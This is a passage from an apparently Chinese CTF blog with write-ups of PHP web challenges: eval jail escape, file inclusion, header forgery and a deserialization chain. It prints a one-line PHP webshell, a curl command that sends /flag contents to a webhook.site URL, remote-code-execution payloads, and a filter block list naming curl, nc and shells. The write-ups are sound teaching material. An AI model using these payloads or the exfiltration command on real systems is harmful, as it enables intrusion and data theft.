class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>第四层通过就是哈希长度扩展，这里就通过hash-ext-attack-master来自动生成</p><p>bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16))这里相当于96位的字符串即密钥</p><p>name里面后面要添加admin字符串所以我们需要在后面添加一个以admin结尾的字符串，其它任意，这里就随便为qadmin</p><p>这里题目会给一个原始的md5值</p><p><img src="https://pic1.imgdb.cn/item/694c85a126657af64c6db56c.png"></p><p><img src="https://pic1.imgdb.cn/item/694c85b026657af64c6db572.png"></p><h1 id="EZ-PHP-Jail"><a href="#EZ-PHP-Jail" class="headerlink" title="EZ_PHP_Jail"></a>EZ_PHP_Jail</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;hint.html&quot;</span>);<br><span class="hljs-variable">$Jail</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Jail_by.Happy&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Jail</span> == <span class="hljs-literal">null</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Do You Like My Jail?&quot;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Like_Jail</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">Like_Jail</span>(<span class="hljs-variable">$Jail</span>)) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$Jail</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You will Jail in your life!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// 在HTML解析后再输出PHP源代码</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这</p><p>个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">?Jail[by.Happy=xxxxxx```<br></code></pre></td></tr></table></figure><p>现在考虑如何得到 flag，在页面源码中可以看见一个文件，访问后再phpinfo中看见过滤了很多内容，但是 highlight_file 函数可以完美绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">?Jail[by.Happy=highlight_file(glob(&quot;/f*&quot;)[0]);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SDPCSEC2025热身赛</title>
    <link href="/2025/11/19/SDPC2025%E7%83%AD%E8%BA%AB%E8%B5%9B/"/>
    <url>/2025/11/19/SDPC2025%E7%83%AD%E8%BA%AB%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h1><p>php图片马</p><p>上传一张图片然后拦截请求，修改文件后缀名及内容，植入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="rHeEsApDoEnRsSe"><a href="#rHeEsApDoEnRsSe" class="headerlink" title="rHeEsApDoEnRsSe"></a>rHeEsApDoEnRsSe</h1><p>根据题目名及页面提示，flag在响应头里面，使用curl命令</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-punctuation">-</span>I http<span class="hljs-punctuation">:</span><span class="hljs-comment">//175.27.251.122:32999/</span><br></code></pre></td></tr></table></figure><p><code>curl</code> 是一个功能强大的命令行工具，主要用于在网络上传输数据，支持多种协议（如 HTTP、HTTPS、FTP、SFTP 等），常被用于测试接口、下载文件、发送请求等场景。以下是其核心用法总结：</p><ol><li><strong>基本请求</strong><ul><li>发送 GET 请求（默认）：<code>curl [URL]</code>，如 <code>curl https://example.com</code></li><li>发送 POST 请求：<code>curl -X POST [URL]</code>，可搭配 <code>-d</code> 传递数据，如 <code>curl -X POST -d &quot;name=test&quot; https://example.com/api</code></li></ul></li><li><strong>设置请求头</strong>用 <code>-H</code> 指定请求头，如模拟浏览器：<code>curl -H &quot;User-Agent: Mozilla/5.0&quot; https://example.com</code></li><li><strong>下载文件</strong><ul><li>保存为指定文件名：<code>curl -o 文件名 [URL]</code>（如 <code>curl -o file.zip https://example.com/file.zip</code>）</li><li>自动以远程文件名保存：<code>curl -O [URL]</code>（URL 需指向具体文件）</li></ul></li><li><strong>处理认证</strong><ul><li>基础认证：<code>curl -u 用户名:密码 [URL]</code></li><li>携带 Cookie：<code>curl -b &quot;cookie1=value1&quot; [URL]</code>，或保存响应 Cookie 到文件：<code>curl -c cookies.txt [URL]</code></li></ul></li><li><strong>其他常用选项</strong><ul><li>显示详细请求过程：<code>curl -v [URL]</code></li><li>跟随重定向：<code>curl -L [URL]</code></li><li>限制传输速度：<code>curl --limit-rate 100k [URL]</code>（如限制为 100KB&#x2F;s）</li><li>请求头：<code>curl -I</code></li></ul></li></ol><h1 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h1><p>首先发现只有一行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zpf&#x27;</span>])<br></code></pre></td></tr></table></figure><p>include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行。</p><p>首先尝试利用<code>?zpf=/etc/passwd</code> 读取系统目录，但并没有发现什么有价值的信息。</p><p>下面尝试利用<code>?zpf=php://filter/convert.base64-encode/resource=index.php</code> 获取源码</p><p>经过Base64解码后得到源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zpf&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;include(\$_GET[&#x27;zpf&#x27;])&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$a</span>);<br>        <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(union|cat|tac|more|less|ls|tree|env|head|tail|nl|sed|awk|grep|strings|od|xxd|curl|wget|nc|netcat|python|perl|ruby|bash|sh|zsh|ksh|tcsh|cmd|powershell)/i&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yzx&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Dangerous command detected!&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yzx&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里我们发现了非常关键的system函数，但程序对yzx进行了正则过滤，所以我们考虑绕过正则过滤，执行命令</p><p>这里我使用了转义符号绕过，成功读取了目录拿到了flag</p><hr><h4 id="常用的伪协议"><a href="#常用的伪协议" class="headerlink" title="常用的伪协议"></a>常用的伪协议</h4><ul><li>php:&#x2F;&#x2F;filter 读取文件源码 （协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码）</li><li>php:&#x2F;&#x2F;input 任意代码执行;这种伪协议用于读取原始的 HTTP POST 数据，可以用于处理上传的文件和表单数据。</li><li>data:&#x2F;&#x2F;text&#x2F;plain 任意代码执行</li><li>zip:&#x2F;&#x2F; 配合文件上传开启后门</li></ul><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://developer.aliyun.com/article/1224913">正则过滤绕过</a></p><p><a href="https://blog.csdn.net/lilongsy/article/details/108146107">文件包含漏洞</a></p><h1 id="貌合神离"><a href="#貌合神离" class="headerlink" title="貌合神离"></a><strong>貌合神离</strong></h1><p>md5大杂烩</p><h4 id="参考文献-1"><a href="#参考文献-1" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://www.cnblogs.com/Yolololo/p/18161894">MD5绕过</a></p><p><a href="https://www.cnblogs.com/dre0m1/p/16062369.html">PHP中MD5和sha1绕过方式总结 - dre0m1 - 博客园</a></p><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">总结ctf中 MD5 绕过的一些思路_ctf md5绕过-CSDN博客</a></p><p><a href="https://www.dr0n.top/posts/ad669f62/">CTF中关于md5的一些总结 - Dr0n’s blog</a></p><h1 id="空谷无音"><a href="#空谷无音" class="headerlink" title="空谷无音"></a>空谷无音</h1><p>首先发现命令执行漏洞，但是没有回显，结合题目描述，考虑用其他方式进行外带</p><ul><li>重定向到文件</li></ul><p>我们可以用流重定向符号来将输出内容重定向到文件中, 在通过浏览器进行下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">cmd_here &gt; 1.txt<br></code></pre></td></tr></table></figure><p>然后就可以通过访问 1.txt 获取到输出内容了</p><ul><li>通过 <code>curl</code> 外带</li></ul><p>我们可以通过 <a href="https://webhook.site/">https://webhook.site/</a> 来进行数据外带, 我们可以拿到这样一个链接</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb<br></code></pre></td></tr></table></figure><p>此时这个路径下的所有请求都会被记录</p><p>于是我们可以通过shell指令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag | base64`<br></code></pre></td></tr></table></figure><ul><li>DNSlog外带</li></ul><h4 id="参考文献-2"><a href="#参考文献-2" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="/html/dnslog.html">DNSlog外带</a></p><h1 id="应声"><a href="#应声" class="headerlink" title="应声"></a>应声</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Pr0&#x27;</span>];<br><span class="hljs-variable">$Acc1o</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Acc1o&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Pr0</span> === <span class="hljs-string">&#x27;Pr0&#x27;</span> &amp;&amp; <span class="hljs-variable">$Acc1o</span> === <span class="hljs-string">&#x27;Acc1o&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>观察代码，发现要求POST Pr0&#x3D;Pr0,GET Acc1o&#x3D;Acc1o,然后执行cmd中的代码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X POST &quot;http://175.27.251.122:33036/?Acc1o=Acc1o&quot; -d &quot;Pr0=Pr0&amp;cmd=system(&#x27;cat /flag;&#x27;);&quot;<br></code></pre></td></tr></table></figure><h4 id="参考文献-3"><a href="#参考文献-3" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://blog.csdn.net/m0_73185293/article/details/131557169">RCE漏洞详解</a></p><p><a href="https://blog.csdn.net/u013372487/article/details/46009075">PHP数据接受变量</a></p><h1 id="杰艾思不想让你看"><a href="#杰艾思不想让你看" class="headerlink" title="杰艾思不想让你看"></a>杰艾思不想让你看</h1><p>首先发现前端无法查看源码，而提示就在源码里面，所以使用burp绕过前端获得源码。</p><p>在源码中发现一个文件S3crett.php，打开得到一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_eval</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/flag/i&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no hacker!!&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] ?? <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">safe_eval</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里我们发现它对cmd进行了正则过滤，不能出现flag</p><p>首先考虑字符串拼接绕过，产生报错。</p><p>再尝试使用base64编码绕过<code>cmd=system(base64_decode(&quot;Y2F0IC9mbGFn&quot;));</code> 成功拿到flag</p><h1 id="六层妖塔"><a href="#六层妖塔" class="headerlink" title="六层妖塔"></a>六层妖塔</h1><p>本题考查HTTP头部伪造技术</p><ul><li>伪造本地IP：<code>X-Forwarded-For: 127.0.0.1</code></li><li>伪造页面来源：<code>Referer: https://服务器要求的合法来源域名/</code></li><li>伪造浏览器：</li><li>伪造用户身份：<code>Cookie: User=Acc1oFl4g</code></li><li>伪造代理服务器：<code>Via: 1.1 123.56.103.169 (Proxy/1.0)</code></li></ul><h1 id="ez-sssseria"><a href="#ez-sssseria" class="headerlink" title="ez_sssseria"></a>ez_sssseria</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// flag in /flag</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cos1ne</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> === <span class="hljs-string">&quot;flag2&quot;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;role) &amp;&amp; <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$this</span>-&gt;role)) &#123;<br>                (<span class="hljs-variable language_">$this</span>-&gt;role)();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ziran</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$temp</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;data-&gt;<span class="hljs-title function_ invoke__">flag2</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pr0</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;username) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;password)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;username-&gt;<span class="hljs-title function_ invoke__">flag1</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yi</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&#x27;Acc1oFl4g&#x27;</span>)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;username-&gt;<span class="hljs-title function_ invoke__">Acc1oFl4g</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acc1o</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;role = <span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;data) != <span class="hljs-string">&#x27;dislike&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;nice&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Acc1oFl4g</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;key));<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先，我们快速浏览一下各个类的功能和可能的利用点：</p><ul><li><strong><code>cos1ne</code> 类</strong>: 有一个 <code>__call</code> 魔术方法。当调用一个不存在的方法 <code>flag2</code> 时，它会检查 <code>$this-&gt;role</code> 是否是一个可调用对象，如果是，就执行它。这是一个典型的 “任意代码执行” 跳板。</li><li><strong><code>ziran</code> 类</strong>: 也有一个 <code>__call</code> 魔术方法。当调用一个不存在的方法时，它会调用 <code>$this-&gt;data</code> 对象的 <code>flag2</code> 方法。这可以用来链式调用。</li><li><strong><code>Pr0</code> 类</strong>: 有一个 <code>__toString</code> 魔术方法。当这个类的对象被当作字符串处理时，它会调用 <code>$this-&gt;username</code> 对象的 <code>flag1</code> 方法。<code>__toString</code> 是反序列化中非常常见的触发点，因为很多操作（如 echo、拼接字符串）都会隐式地调用它。</li><li><strong><code>yi</code> 类</strong>: 有一个 <code>__invoke</code> 魔术方法。当尝试将这个类的对象当作函数来调用时，它会检查 <code>$this-&gt;username</code> 对象是否存在 <code>Acc1oFl4g</code> 方法，如果存在，就调用它。</li><li><strong><code>Acc1o</code> 类</strong>: 这是最终的目标类。<ul><li>它有一个 <code>Acc1oFl4g</code> 方法，可以读取 <code>$this-&gt;key</code> 指定的文件内容。我们的目标就是让这个方法执行 <code>file_get_contents(&#39;/flag&#39;)</code>。</li><li>它还有一个 <code>__destruct</code> 魔术方法。当对象被销毁时，它会检查 <code>md5($this-&gt;data)</code> 是否等于 <code>&#39;dislike&#39;</code>。这个 <code>__destruct</code> 方法本身没有直接的危害，但它是反序列化链的<strong>起点</strong>，因为反序列化后，对象会被自动销毁，从而触发 <code>__destruct</code>。</li></ul></li></ul><p><strong>关键问题：</strong> <code>Acc1o</code> 类的 <code>__destruct</code> 方法似乎只是做了一个判断，并没有触发任何其他魔术方法。我们如何从这里开始，构建一条能够到达 <code>Acc1oFl4g</code> 方法的调用链呢？</p><p>让我们换个思路。如果 <code>$this-&gt;data</code> 本身是一个对象呢？当 <code>md5($this-&gt;data)</code> 执行时，<code>md5</code> 函数需要一个字符串，所以它会尝试将 <code>$this-&gt;data</code> 对象转换为字符串，这就会触发该对象的 <code>__toString</code> 方法！</p><h3 id="构建利用链"><a href="#构建利用链" class="headerlink" title="构建利用链"></a>构建利用链</h3><p>我们的目标是调用 <code>Acc1o</code> 类的 <code>Acc1oFl4g</code> 方法，并让它的 <code>$key</code> 属性为 <code>/flag</code>。</p><p>我们可以构建如下的调用链：</p><ol><li><strong>起点 (<code>Acc1o-&gt;__destruct</code>)</strong>: 反序列化后，<code>Acc1o</code> 对象被销毁，触发 <code>__destruct</code>。</li><li><strong>触发点 (<code>Pr0-&gt;__toString</code>)</strong>: 在 <code>__destruct</code> 中，<code>md5($this-&gt;data)</code> 被执行。我们让 <code>$this-&gt;data</code> 指向一个 <code>Pr0</code> 